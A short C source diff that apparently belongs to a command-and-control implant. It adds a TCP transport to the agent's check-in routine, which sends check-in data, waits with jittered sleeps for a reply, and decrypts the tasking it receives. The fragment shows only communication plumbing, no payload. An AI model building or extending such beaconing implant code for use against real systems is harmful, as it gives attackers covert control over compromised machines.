@@ -3,6 +3,7 @@
 #include "Task.h"
 
 #include "TransportSmb.h"
+#include "TransportTcp.h"
 
 #include <lm.h>
 #include <lmwksta.h>
@@ -235,6 +236,32 @@ BOOL CheckinSend()
         SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
 
         SmbRecieve(&pOutData, &OutLen);
+
+    }
+
+    ParserNew(&Output, pOutData, OutLen);
+
+    ParserDecrypt(&Output);
+
+#endif
+
+#ifdef TCP_TRANSPORT
+
+    PBYTE  pOutData  = NULL;
+    SIZE_T OutLen    = 0;
+    SIZE_T sizeUuid  = TASK_UUID_SIZE;
+
+    PackageSend(CheckinData, NULL);
+
+    _dbg("[TCP] Waiting for checkin response...");
+
+    // Sloppy 
+    while ( pOutData == NULL || OutLen == 0 )
+    {
+
+        SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
+
+        TcpRecieve(&pOutData, &OutLen);
 
     }
 
